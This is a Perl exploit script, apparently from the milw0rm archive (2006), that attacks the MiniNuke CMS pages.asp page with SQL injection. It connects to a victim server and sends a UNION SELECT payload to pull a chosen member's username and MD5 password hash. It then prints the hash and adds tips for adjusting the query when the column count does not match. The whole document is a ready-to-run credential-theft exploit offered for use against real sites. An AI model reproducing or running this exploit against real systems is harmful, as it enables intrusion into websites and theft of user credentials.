<html><head><title>MiniNuke <= 1.8.2b (pages.asp) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#Method found &amp; Exploit scripted by nukedx
#Contacts &gt; ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
#Orginal advisory: http://www.nukedx.com/?viewdoc=9
#Usage: mini.pl &lt;victim.com&gt; &lt;/mininuke-dir&gt; &lt;userid&gt;
use IO::Socket;
if(@ARGV != 3){
print &quot;
+**********************************************************************+
+Welcome to MiniNuke CMS System all versions (pages.asp) SQL-inject xpl+
+            Usage: mini.pl &lt;victim&gt; &lt;directory&gt; &lt;userid&gt;              +
+                    Example: mini.pl sux.com / 1                      +
+               Method found &amp; Exploit scripted by nukedx              +
+**********************************************************************+
&quot;;
exit();
}
#Local variables
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$port = &quot;80&quot;;
$mndir = $ARGV[1];
$victimid = $ARGV[2];
$sreq =&quot;http://&quot;.$server.$mndir.&quot;pages.asp?id=3%20union+select+0,kul_adi,sifre,0,0+from+members+where+uye_id=&quot;.$victimid;
#Writing data to socket
print &quot;+**********************************************************************+\n&quot;;
print &quot;+ Trying to connect: $server\n&quot;;
$mns = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$server&quot;, PeerPort =&gt; &quot;$port&quot;) || die &quot;\n+ Connection failed...\n&quot;;
print $mns &quot;GET $sreq\n&quot;;
print $mns &quot;Host: $server\n&quot;;
print $mns &quot;Accept: */*\n&quot;;
print $mns &quot;Connection: close\n\n&quot;;
print &quot;+ Connected!...\n&quot;;
	while($answer = &lt;$mns&gt;) {
		if ($answer =~ /([\d,a-f]{32})/) { 
			print &quot;+ USERID: $victimid\n&quot;;
                        print &quot;+ MD5 HASH: $1\n&quot;;
			print &quot;+**********************************************************************+\n&quot;;
			exit(); }
		if ($answer =~ /number of columns/) { 
                print &quot;+ This version of Mini-Nuke is vulnerable too but default query of SQL-inject does not work on it\n&quot;;
                print &quot;+ So please edit query by manually adding null data..\n&quot;;
                exit(); }
	}
print &quot;+ Exploit failed\n&quot;;
print &quot;+**********************************************************************+\n&quot;;

# nukedx.com [2006-02-19]

# milw0rm.com [2006-02-19]</pre></html>